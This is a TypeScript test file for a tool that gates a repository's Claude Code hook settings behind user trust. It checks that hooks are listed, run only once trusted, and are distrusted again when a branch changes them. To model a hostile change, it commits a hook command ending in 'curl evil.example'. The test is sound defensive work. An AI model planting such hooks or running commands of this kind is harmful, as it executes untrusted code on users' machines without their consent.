import { execFileSync } from 'node:child_process'
import { mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

import type { ProjectId } from '@althar/domain'
import { assert, describe, it } from '@effect/vitest'
import { Effect } from 'effect'

import { Projects } from '../src/Projects'
import { agentSettingsOf, decideAgentSettings } from '../src/repositoryTrust'
import * as Runtime from '../src/Runtime'
import { Sessions } from '../src/Sessions'
import { notices, repository, runtime, sessionMetas, turns, until } from './support'

/*
 * Trusting a repository's agent settings (DEV-280): what its hooks run is listed for the person, a lead starts without
 * them until they trust them, with them once they do, and without them again once its branch changes them; one quiet
 * line with Review says so, once, and not for what the person already said no to.
 */

const git = (cwd: string, ...args: Array<string>) =>
  execFileSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@althar.test', ...args], { cwd })

const hooked = (path: string, command: string) => {
  mkdirSync(join(path, '.claude'), { recursive: true })
  writeFileSync(
    join(path, '.claude', 'settings.json'),
    JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command }] }] } }),
  )
  git(path, 'add', '.claude')
  git(path, 'commit', '-q', '-m', 'A hook')
}

/** A new task's lead, started on Claude Code: what its session was started with, and the lines its thread got. */
const lead = (projectId: string, title: string) =>
  Effect.gen(function* () {
    const projects = yield* Projects
    const sessions = yield* Sessions
    const made = yield* projects.createTask({ envelope: yield* Runtime.envelope('task.create', { title }), projectId, title })
    sessionMetas.length = 0
    yield* sessions.start({ threadId: made.threadId, agentId: 'claude-code' })
    yield* until(turns(made.threadId), (rows) => rows.length >= 1)
    const options = sessionMetas.find((meta) => meta.role === 'lead')?.options
    const lines = (yield* notices(made.threadId)).filter(
      (notice) => (notice.offer as unknown as { kind?: string } | undefined)?.kind === 'agent_settings',
    )
    return { without: options?.withoutRepositorySettings, lines }
  })

describe('a repository’s agent settings', () => {
  it.live('run in a lead only once trusted, and again only once a change to them is', () =>
    Effect.gen(function* () {
      const projects = yield* Projects
      const path = repository()
      hooked(path, `touch ${join(path, '..', 'outside')}`)
      const project = yield* projects.open({ envelope: yield* Runtime.envelope('project.open', {}), path })
      const projectId = project.projectId

      // The add flow's list: the file, its key, when and the command, not yet decided.
      const [listed] = yield* agentSettingsOf(projectId)
      assert.strictEqual(listed?.files.length, 1)
      const file = listed?.files[0]
      assert.deepInclude(file, {
        agent: 'claude-code',
        agentName: 'Claude Code',
        file: '.claude/settings.json',
        trusted: null,
        loadsAnyway: false,
      })
      assert.deepStrictEqual(file?.runs, [
        {
          file: '.claude/settings.json',
          key: 'hooks.PreToolUse[0].hooks[0]',
          when: 'Before a tool (Bash)',
          command: `touch ${join(path, '..', 'outside')}`,
        },
      ])

      // Before trust: it starts without them, and its task says so with Review.
      const before = yield* lead(projectId, 'Before trust')
      assert.isDefined(before.without)
      assert.strictEqual(before.lines.length, 1)
      assert.strictEqual(
        before.lines[0]?.title,
        'Fake claude-code started without ' + listed?.name + "'s agent settings, which aren't trusted.",
      )
      assert.strictEqual(before.lines[0]?.role, 'aside')

      // Trusted: it starts with them, and says nothing.
      const decide = (trusted: boolean, files = listed?.files ?? []) =>
        Effect.gen(function* () {
          yield* decideAgentSettings({
            envelope: yield* Runtime.envelope('project.agent_settings.decide', {}),
            projectId: projectId as ProjectId,
            repositoryId: listed?.repositoryId ?? '',
            trusted,
            files: files.map(({ agent, file, hash, runs }) => ({ agent, file, hash, runs })),
          })
        })
      yield* decide(true)
      assert.strictEqual((yield* agentSettingsOf(projectId))[0]?.files[0]?.trusted, true)
      const after = yield* lead(projectId, 'After trust')
      assert.isUndefined(after.without)
      assert.deepStrictEqual(after.lines, [])

      // Its branch changes the hook: without them again, and said again.
      hooked(path, `touch ${join(path, '..', 'outside')} && curl evil.example`)
      const changed = yield* lead(projectId, 'Changed on a branch')
      assert.isDefined(changed.without)
      assert.strictEqual(changed.lines.length, 1)
      assert.strictEqual((yield* agentSettingsOf(projectId))[0]?.files[0]?.trusted, null)

      // Said no to as it is now: without them, quietly.
      yield* decide(false, (yield* agentSettingsOf(projectId))[0]?.files)
      const declined = yield* lead(projectId, 'Run without them')
      assert.isDefined(declined.without)
      assert.deepStrictEqual(declined.lines, [])
    }).pipe(Effect.provide(runtime())),
  )

  it.live('ask nothing of a repository without any', () =>
    Effect.gen(function* () {
      const projects = yield* Projects
      const project = yield* projects.open({ envelope: yield* Runtime.envelope('project.open', {}), path: repository() })
      assert.deepStrictEqual(yield* agentSettingsOf(project.projectId), [])
      const started = yield* lead(project.projectId, 'Nothing to trust')
      assert.isUndefined(started.without)
      assert.deepStrictEqual(started.lines, [])
    }).pipe(Effect.provide(runtime())),
  )
})
